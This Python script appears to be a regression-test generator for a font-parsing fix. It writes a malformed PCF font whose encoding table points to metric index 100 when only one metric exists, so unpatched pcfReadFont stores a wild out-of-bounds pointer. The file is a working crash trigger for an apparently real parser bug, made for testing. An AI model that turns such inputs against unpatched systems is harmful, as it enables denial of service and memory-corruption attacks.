#!/usr/bin/env python3
"""
Generate a malicious PCF font with an out-of-bounds encoding offset.

The font has 1 metric but the encoding table references metric index
100, far past the metrics array.  Without the fix, pcfReadFont stores
a wild pointer (metrics + 100) in the encoding table.

Based on gen_evil_pcf_repad.py structure for a known-good PCF layout.

Usage:
    python3 gen_evil_pcf_encoding.py <output_dir>
"""

import struct
import sys
import os

PCF_DEFAULT_FORMAT = 0x00000000
PCF_PROPERTIES = 1
PCF_ACCELERATORS = 2
PCF_METRICS = 4
PCF_BITMAPS = 8
PCF_BDF_ENCODINGS = 32


def u32(x):
    return struct.pack("<I", x & 0xFFFFFFFF)


def i32(x):
    return struct.pack("<i", x)


def u16(x):
    return struct.pack("<H", x & 0xFFFF)


def i16(x):
    return struct.pack("<h", x)


def u8(x):
    return struct.pack("<B", x & 0xFF)


def xCharInfo(lsb, rsb, cw, asc, desc, attr):
    return i16(lsb) + i16(rsb) + i16(cw) + i16(asc) + i16(desc) + u16(attr)


# Glyph: 8x10
LSB, RSB = 0, 8
ASCENT, DESCENT = 8, 2
CHAR_WIDTH = 8

# Bitmap: pad=1, 1 byte/row * 10 rows = 10 bytes
BITMAP_DATA_SIZE = 10
BITMAP_SIZES = [BITMAP_DATA_SIZE, 20, 40, 80]

# --- PROPERTIES (same as repad test) ---
properties = b""
properties += u32(PCF_DEFAULT_FORMAT)
properties += i32(1)
properties += i32(0)
properties += u8(0)
properties += i32(0)
properties += b"\x00" * 3
properties += i32(1)
properties += b"\x00"

# --- ACCELERATORS ---
accel = b""
accel += u32(PCF_DEFAULT_FORMAT)
accel += u8(0) * 8
accel += i32(ASCENT)
accel += i32(DESCENT)
accel += i32(0)
accel += xCharInfo(0, 0, 0, 0, 0, 0)
accel += xCharInfo(LSB, RSB, CHAR_WIDTH, ASCENT, DESCENT, 0)

# --- METRICS (1 glyph) ---
metrics = b""
metrics += u32(PCF_DEFAULT_FORMAT)
metrics += i32(1)  # nmetrics = 1
metrics += xCharInfo(LSB, RSB, CHAR_WIDTH, ASCENT, DESCENT, 0)

# --- BITMAPS ---
bitmaps = b""
bitmaps += u32(PCF_DEFAULT_FORMAT)
bitmaps += i32(1)  # nbitmaps = 1
bitmaps += u32(0)  # offset[0] = 0
for sz in BITMAP_SIZES:
    bitmaps += u32(sz)
bitmaps += b"\xaa" * BITMAP_DATA_SIZE

# --- BDF_ENCODINGS ---
# EVIL: encoding offset 100, but nmetrics is only 1
EVIL_OFFSET = 100
encodings = b""
encodings += u32(PCF_DEFAULT_FORMAT)
encodings += u16(0) + u16(0)  # firstCol, lastCol
encodings += u16(0) + u16(0)  # firstRow, lastRow
encodings += u16(0)  # defaultCh
encodings += u16(EVIL_OFFSET)  # encoding[0] -> metric[100] OOB!

# --- Assemble ---
TABLE_COUNT = 5
BODY_START = 8 + TABLE_COUNT * 16

properties_off = BODY_START
accel_off = properties_off + len(properties)
metrics_off = accel_off + len(accel)
bitmaps_off = metrics_off + len(metrics)
encodings_off = bitmaps_off + len(bitmaps)


def toc(type_, format_, size, offset):
    return u32(type_) + u32(format_) + u32(size) + u32(offset)


out = b"\x01fcp" + u32(TABLE_COUNT)
out += toc(PCF_PROPERTIES, 0, len(properties), properties_off)
out += toc(PCF_ACCELERATORS, 0, len(accel), accel_off)
out += toc(PCF_METRICS, 0, len(metrics), metrics_off)
out += toc(PCF_BITMAPS, 0, len(bitmaps), bitmaps_off)
out += toc(PCF_BDF_ENCODINGS, 0, len(encodings), encodings_off)
out += properties + accel + metrics + bitmaps + encodings

output_dir = sys.argv[1] if len(sys.argv) > 1 else "."
os.makedirs(output_dir, exist_ok=True)

pcf_name = "evil-encoding.pcf"
xlfd = "-evil-encoding-medium-r-normal--10-100-75-75-c-80-iso10646-1"

with open(os.path.join(output_dir, pcf_name), "wb") as f:
    f.write(out)

with open(os.path.join(output_dir, "fonts.dir"), "w") as f:
    f.write("1\n")
    f.write(f"{pcf_name} {xlfd}\n")
